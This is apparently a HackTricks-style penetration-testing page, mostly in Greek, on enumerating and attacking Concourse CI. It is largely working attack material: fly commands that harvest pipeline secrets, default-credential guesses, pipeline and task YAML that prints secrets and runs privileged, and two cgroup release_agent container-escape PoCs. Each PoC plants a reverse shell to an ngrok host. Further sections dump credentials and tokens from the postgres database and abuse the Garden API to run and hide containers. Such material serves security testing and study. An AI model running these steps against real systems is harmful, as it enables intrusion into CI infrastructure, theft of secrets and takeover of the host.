# Concourse Enumeration & Attacks

## Concourse Enumeration & Attacks

{{#include ../../banners/hacktricks-training.md}}

### User Roles & Permissions

Το Concourse έρχεται με πέντε ρόλους:

- _Concourse_ **Admin**: Αυτός ο ρόλος δίνεται μόνο στους ιδιοκτήτες της **κύριας ομάδας** (προεπιλεγμένη αρχική ομάδα του concourse). Οι διαχειριστές μπορούν να **ρυθμίσουν άλλες ομάδες** (π.χ.: `fly set-team`, `fly destroy-team`...). Οι άδειες αυτού του ρόλου δεν μπορούν να επηρεαστούν από το RBAC.
- **owner**: Οι ιδιοκτήτες ομάδων μπορούν να **τροποποιήσουν τα πάντα εντός της ομάδας**.
- **member**: Τα μέλη της ομάδας μπορούν να **διαβάσουν και να γράψουν** εντός των **πόρων της ομάδας** αλλά δεν μπορούν να τροποποιήσουν τις ρυθμίσεις της ομάδας.
- **pipeline-operator**: Οι χειριστές pipeline μπορούν να εκτελούν **λειτουργίες pipeline** όπως η ενεργοποίηση κατασκευών και η σταθεροποίηση πόρων, ωστόσο δεν μπορούν να ενημερώσουν τις ρυθμίσεις του pipeline.
- **viewer**: Οι θεατές της ομάδας έχουν **"μόνο ανάγνωση" πρόσβαση σε μια ομάδα** και τα pipelines της.

> [!NOTE]
> Επιπλέον, οι **άδειες των ρόλων owner, member, pipeline-operator και viewer μπορούν να τροποποιηθούν** ρυθμίζοντας το RBAC (ρυθμίζοντας πιο συγκεκριμένα τις ενέργειές του). Διαβάστε περισσότερα γι' αυτό στο: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)

Σημειώστε ότι το Concourse **ομαδοποιεί τα pipelines μέσα σε Ομάδες**. Επομένως, οι χρήστες που ανήκουν σε μια Ομάδα θα μπορούν να διαχειρίζονται αυτά τα pipelines και **πολλές Ομάδες** μπορεί να υπάρχουν. Ένας χρήστης μπορεί να ανήκει σε πολλές Ομάδες και να έχει διαφορετικές άδειες σε κάθε μία από αυτές.

### Vars & Credential Manager

Στις ρυθμίσεις YAML μπορείτε να ρυθμίσετε τιμές χρησιμοποιώντας τη σύνταξη `((_source-name_:_secret-path_._secret-field_))`.\
[Από τα έγγραφα:](https://concourse-ci.org/vars.html#var-syntax) Το **source-name είναι προαιρετικό**, και αν παραληφθεί, θα χρησιμοποιηθεί ο [διαχειριστής διαπιστευτηρίων σε επίπεδο κλάστερ](https://concourse-ci.org/vars.html#cluster-wide-credential-manager), ή η τιμή μπορεί να παρασχεθεί [στατικά](https://concourse-ci.org/vars.html#static-vars).\
Το **προαιρετικό \_secret-field**\_ καθορίζει ένα πεδίο στο ανακτηθέν μυστικό για ανάγνωση. Αν παραληφθεί, ο διαχειριστής διαπιστευτηρίων μπορεί να επιλέξει να διαβάσει ένα 'προεπιλεγμένο πεδίο' από το ανακτηθέν διαπιστευτήριο αν το πεδίο υπάρχει.\
Επιπλέον, το _**secret-path**_ και _**secret-field**_ μπορεί να περιβάλλεται από διπλά εισαγωγικά `"..."` αν **περιέχουν ειδικούς χαρακτήρες** όπως `.` και `:`. Για παράδειγμα, `((source:"my.secret"."field:1"))` θα ρυθμίσει το _secret-path_ σε `my.secret` και το _secret-field_ σε `field:1`.

#### Static Vars

Οι στατικές μεταβλητές μπορούν να καθοριστούν σε **βήματα εργασιών**:
```yaml
- task: unit-1.13
file: booklit/ci/unit.yml
vars: { tag: 1.13 }
```
Ή χρησιμοποιώντας τα παρακάτω `fly` **ορίσματα**:

- `-v` ή `--var` `NAME=VALUE` ορίζει τη συμβολοσειρά `VALUE` ως την τιμή για τη μεταβλητή `NAME`.
- `-y` ή `--yaml-var` `NAME=VALUE` αναλύει το `VALUE` ως YAML και το ορίζει ως την τιμή για τη μεταβλητή `NAME`.
- `-i` ή `--instance-var` `NAME=VALUE` αναλύει το `VALUE` ως YAML και το ορίζει ως την τιμή για τη μεταβλητή της παρουσίας `NAME`. Δείτε [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) για να μάθετε περισσότερα σχετικά με τις μεταβλητές παρουσίας.
- `-l` ή `--load-vars-from` `FILE` φορτώνει το `FILE`, ένα έγγραφο YAML που περιέχει αντιστοίχιση ονομάτων μεταβλητών σε τιμές, και τα ορίζει όλα.

#### Διαχείριση Διαπιστευτηρίων

Υπάρχουν διάφοροι τρόποι με τους οποίους μπορεί να καθοριστεί ένας **Διαχειριστής Διαπιστευτηρίων** σε μια ροή εργασίας, διαβάστε πώς στο [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
Επιπλέον, το Concourse υποστηρίζει διάφορους διαχειριστές διαπιστευτηρίων:

- [Ο διαχειριστής διαπιστευτηρίων Vault](https://concourse-ci.org/vault-credential-manager.html)
- [Ο διαχειριστής διαπιστευτηρίων CredHub](https://concourse-ci.org/credhub-credential-manager.html)
- [Ο διαχειριστής διαπιστευτηρίων AWS SSM](https://concourse-ci.org/aws-ssm-credential-manager.html)
- [Ο διαχειριστής διαπιστευτηρίων AWS Secrets Manager](https://concourse-ci.org/aws-asm-credential-manager.html)
- [Διαχειριστής Διαπιστευτηρίων Kubernetes](https://concourse-ci.org/kubernetes-credential-manager.html)
- [Ο διαχειριστής διαπιστευτηρίων Conjur](https://concourse-ci.org/conjur-credential-manager.html)
- [Caching credentials](https://concourse-ci.org/creds-caching.html)
- [Redacting credentials](https://concourse-ci.org/creds-redacting.html)
- [Retrying failed fetches](https://concourse-ci.org/creds-retry-logic.html)

> [!CAUTION]
> Σημειώστε ότι αν έχετε κάποιο είδος **δικαιώματος εγγραφής στο Concourse** μπορείτε να δημιουργήσετε εργασίες για να **εξάγετε αυτά τα μυστικά** καθώς το Concourse πρέπει να μπορεί να έχει πρόσβαση σε αυτά.

### Αρίθμηση Concourse

Για να αρίσετε ένα περιβάλλον concourse πρέπει πρώτα να **συγκεντρώσετε έγκυρα διαπιστευτήρια** ή να βρείτε ένα **επικυρωμένο διακριτικό** πιθανώς σε ένα αρχείο ρυθμίσεων `.flyrc`.

#### Σύνδεση και Αρίθμηση Τρέχοντος Χρήστη

- Για να συνδεθείτε πρέπει να γνωρίζετε το **endpoint**, το **όνομα ομάδας** (προεπιλογή είναι το `main`) και μια **ομάδα στην οποία ανήκει ο χρήστης**:
- `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
- Λάβετε τις ρυθμισμένες **στόχους**:
- `fly targets`
- Ελέγξτε αν η ρυθμισμένη **σύνδεση στόχου** είναι ακόμα **έγκυρη**:
- `fly -t <target> status`
- Λάβετε το **ρόλο** του χρήστη σε σχέση με τον καθορισμένο στόχο:
- `fly -t <target> userinfo`

> [!NOTE]
> Σημειώστε ότι το **API token** είναι **αποθηκευμένο** στο `$HOME/.flyrc` από προεπιλογή, εάν ελέγχετε μια μηχανή μπορείτε να βρείτε εκεί τα διαπιστευτήρια.

#### Ομάδες & Χρήστες

- Λάβετε μια λίστα με τις Ομάδες
- `fly -t <target> teams`
- Λάβετε ρόλους μέσα στην ομάδα
- `fly -t <target> get-team -n <team-name>`
- Λάβετε μια λίστα χρηστών
- `fly -t <target> active-users`

#### Ροές Εργασίας

- **Λίστα** ροών εργασίας:
- `fly -t <target> pipelines -a`
- **Λάβετε** το yaml της ροής εργασίας (**ευαίσθητες πληροφορίες** μπορεί να βρεθούν στον ορισμό):
- `fly -t <target> get-pipeline -p <pipeline-name>`
- Λάβετε όλες τις **δηλωμένες μεταβλητές ρυθμίσεων** της ροής εργασίας
- `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
- Λάβετε όλα τα **ονόματα μυστικών ροών εργασίας που χρησιμοποιούνται** (αν μπορείτε να δημιουργήσετε/τροποποιήσετε μια εργασία ή να καταλάβετε ένα κοντέινερ μπορείτε να τα εξάγετε):
```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do
echo $pipename;
fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```
#### Containers & Workers

- Λίστα **workers**:
- `fly -t <target> workers`
- Λίστα **containers**:
- `fly -t <target> containers`
- Λίστα **builds** (για να δείτε τι τρέχει):
- `fly -t <target> builds`

### Concourse Attacks

#### Credentials Brute-Force

- admin:admin
- test:test

#### Secrets and params enumeration

Στην προηγούμενη ενότητα είδαμε πώς μπορείτε να **πάρετε όλα τα ονόματα και τις μεταβλητές των μυστικών** που χρησιμοποιούνται από την pipeline. Οι **μεταβλητές μπορεί να περιέχουν ευαίσθητες πληροφορίες** και το όνομα των **μυστικών θα είναι χρήσιμο αργότερα για να προσπαθήσετε να τα κλέψετε**.

#### Session inside running or recently run container

Αν έχετε αρκετά δικαιώματα (**member role ή περισσότερα**) θα μπορείτε να **λίστα pipelines και ρόλους** και απλά να αποκτήσετε μια **session μέσα** στο `<pipeline>/<job>` **container** χρησιμοποιώντας:
```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```
Με αυτές τις άδειες μπορεί να είστε σε θέση να:

- **Κλέψετε τα μυστικά** μέσα στο **container**
- Προσπαθήσετε να **ξεφύγετε** στον κόμβο
- Αριθμήσετε/Κακοποιήσετε το **cloud metadata** endpoint (από το pod και από τον κόμβο, αν είναι δυνατόν)

#### Δημιουργία/Τροποποίηση Pipeline

Αν έχετε αρκετά προνόμια (**ρόλος μέλους ή περισσότερα**) θα μπορείτε να **δημιουργήσετε/τροποποιήσετε νέα pipelines.** Ελέγξτε αυτό το παράδειγμα:
```yaml
jobs:
- name: simple
plan:
- task: simple-task
privileged: true
config:
# Tells Concourse which type of worker this task should run on
platform: linux
image_resource:
type: registry-image
source:
repository: busybox # images are pulled from docker hub by default
run:
path: sh
args:
- -cx
- |
echo "$SUPER_SECRET"
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```
Με την **τροποποίηση/δημιουργία** μιας νέας ροής εργασίας θα μπορείτε να:

- **Κλέψετε** τα **μυστικά** (μέσω της εκτύπωσής τους ή μπαίνοντας μέσα στο κοντέινερ και εκτελώντας `env`)
- **Δραπετεύσετε** στη **νοητή** (δίνοντάς σας αρκετά δικαιώματα - `privileged: true`)
- Να καταγράψετε/Κακοποιήσετε το **cloud metadata** endpoint (από το pod και από τη νοητή)
- **Διαγράψετε** τη δημιουργημένη ροή εργασίας

#### Εκτέλεση Προσαρμοσμένης Εργασίας

Αυτό είναι παρόμοιο με την προηγούμενη μέθοδο, αλλά αντί να τροποποιήσετε/δημιουργήσετε μια ολόκληρη νέα ροή εργασίας, μπορείτε **απλώς να εκτελέσετε μια προσαρμοσμένη εργασία** (η οποία πιθανότατα θα είναι πολύ πιο **αόρατη**):
```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
type: registry-image
source:
repository: ubuntu
run:
path: sh
args:
- -cx
- |
env
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```
#### Διαφυγή στον κόμβο από προνομιούχα εργασία

Στις προηγούμενες ενότητες είδαμε πώς να **εκτελέσουμε μια προνομιούχα εργασία με το concourse**. Αυτό δεν θα δώσει στο κοντέινερ ακριβώς την ίδια πρόσβαση με την προνομιούχα σημαία σε ένα κοντέινερ docker. Για παράδειγμα, δεν θα δείτε τη συσκευή του συστήματος αρχείων του κόμβου στο /dev, οπότε η διαφυγή μπορεί να είναι πιο "πολύπλοκη".

Στην παρακάτω PoC θα χρησιμοποιήσουμε τον release_agent για να διαφύγουμε με κάποιες μικρές τροποποιήσεις:
```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
> [!WARNING]
> Όπως μπορεί να έχετε παρατηρήσει, αυτό είναι απλώς μια [**κανονική απελευθέρωση_agent escape**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/concourse-security/broken-reference/README.md) απλά τροποποιώντας τη διαδρομή της εντολής στο node

#### Απελευθέρωση στο node από ένα Worker container

Μια κανονική απελευθέρωση_agent escape με μια μικρή τροποποίηση είναι αρκετή για αυτό:
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
#### Εξα escaping στο node από το Web container

Ακόμα και αν το web container έχει κάποιες άμυνες απενεργοποιημένες, **δεν τρέχει ως κοινό προνομιούχο container** (για παράδειγμα, **δεν μπορείτε** να **mount** και οι **ικανότητες** είναι πολύ **περιορισμένες**, οπότε όλοι οι εύκολοι τρόποι για να ξεφύγετε από το container είναι άχρηστοι).

Ωστόσο, αποθηκεύει **τοπικά διαπιστευτήρια σε καθαρό κείμενο**:
```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```
Μπορείτε να χρησιμοποιήσετε αυτά τα διαπιστευτήρια για να **συνδεθείτε στον διακομιστή ιστού** και να **δημιουργήσετε ένα προνομιακό κοντέινερ και να διαφύγετε στον κόμβο**.

Στο περιβάλλον μπορείτε επίσης να βρείτε πληροφορίες για **πρόσβαση στην εγκατάσταση postgresql** που χρησιμοποιεί το concourse (διεύθυνση, **όνομα χρήστη**, **κωδικός πρόσβασης** και βάση δεδομένων μεταξύ άλλων πληροφοριών):
```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```
#### Κατάχρηση Υπηρεσίας Garden - Όχι μια πραγματική Επίθεση

> [!WARNING]
> Αυτές είναι απλώς μερικές ενδιαφέρουσες σημειώσεις σχετικά με την υπηρεσία, αλλά επειδή ακούει μόνο σε localhost, αυτές οι σημειώσεις δεν θα έχουν καμία επίδραση που δεν έχουμε ήδη εκμεταλλευτεί πριν.

Από προεπιλογή, κάθε concourse worker θα εκτελεί μια [**Garden**](https://github.com/cloudfoundry/garden) υπηρεσία στη θύρα 7777. Αυτή η υπηρεσία χρησιμοποιείται από τον Web master για να υποδείξει στον worker **τι χρειάζεται να εκτελέσει** (να κατεβάσει την εικόνα και να εκτελέσει κάθε εργασία). Αυτό ακούγεται αρκετά καλό για έναν επιτιθέμενο, αλλά υπάρχουν μερικές καλές προστασίες:

- Είναι απλώς **εκτεθειμένο τοπικά** (127..0.0.1) και νομίζω ότι όταν ο worker αυθεντικοποιείται απέναντι στον Web με την ειδική υπηρεσία SSH, δημιουργείται μια σήραγγα ώστε ο web server να μπορεί να **επικοινωνεί με κάθε υπηρεσία Garden** μέσα σε κάθε worker.
- Ο web server **παρακολουθεί τους εκτελούμενους κοντέινερ κάθε λίγα δευτερόλεπτα**, και **μη αναμενόμενα** κοντέινερ **διαγράφονται**. Έτσι, αν θέλετε να **τρέξετε ένα προσαρμοσμένο κοντέινερ** πρέπει να **παρέμβετε** στην **επικοινωνία** μεταξύ του web server και της υπηρεσίας garden.

Οι concourse workers εκτελούνται με υψηλά δικαιώματα κοντέινερ:
```
Container Runtime: docker
Has Namespaces:
pid: true
user: false
AppArmor Profile: kernel
Capabilities:
BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```
Ωστόσο, τεχνικές όπως το **mounting** της συσκευής /dev του κόμβου ή του release_agent **δεν θα λειτουργήσουν** (καθώς η πραγματική συσκευή με το filesystem του κόμβου δεν είναι προσβάσιμη, μόνο μία εικονική). Δεν μπορούμε να έχουμε πρόσβαση σε διαδικασίες του κόμβου, οπότε η διαφυγή από τον κόμβο χωρίς exploits πυρήνα γίνεται περίπλοκη.

> [!NOTE]
> Στην προηγούμενη ενότητα είδαμε πώς να διαφύγουμε από ένα προνομιούχο κοντέινερ, οπότε αν μπορούμε να **εκτελέσουμε** εντολές σε ένα **προνομιούχο κοντέινερ** που δημιουργήθηκε από τον **τρέχοντα** **εργάτη**, θα μπορούσαμε να **διαφύγουμε στον κόμβο**.

Σημειώστε ότι παίζοντας με το concourse παρατήρησα ότι όταν δημιουργείται ένα νέο κοντέινερ για να τρέξει κάτι, οι διαδικασίες του κοντέινερ είναι προσβάσιμες από το κοντέινερ του εργάτη, οπότε είναι σαν ένα κοντέινερ να δημιουργεί ένα νέο κοντέινερ μέσα σε αυτό.

**Είσοδος σε ένα τρέχον προνομιούχο κοντέινερ**
```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
## In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'

# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```
**Δημιουργία ενός νέου προνομιούχου κοντέινερ**

Μπορείτε πολύ εύκολα να δημιουργήσετε ένα νέο κοντέινερ (απλώς εκτελέστε ένα τυχαίο UID) και να εκτελέσετε κάτι σε αυτό:
```bash
curl -X POST http://127.0.0.1:7777/containers \
-H 'Content-Type: application/json' \
-d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```
Ωστόσο, ο διακομιστής ιστού ελέγχει κάθε λίγα δευτερόλεπτα τα κοντέινερ που εκτελούνται, και αν ανακαλυφθεί κάποιο απροσδόκητο, θα διαγραφεί. Καθώς η επικοινωνία πραγματοποιείται μέσω HTTP, θα μπορούσατε να παραποιήσετε την επικοινωνία για να αποφύγετε τη διαγραφή απροσδόκητων κοντέινερ:
```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```
## Αναφορές

- https://concourse-ci.org/vars.html

{{#include ../../banners/hacktricks-training.md}}
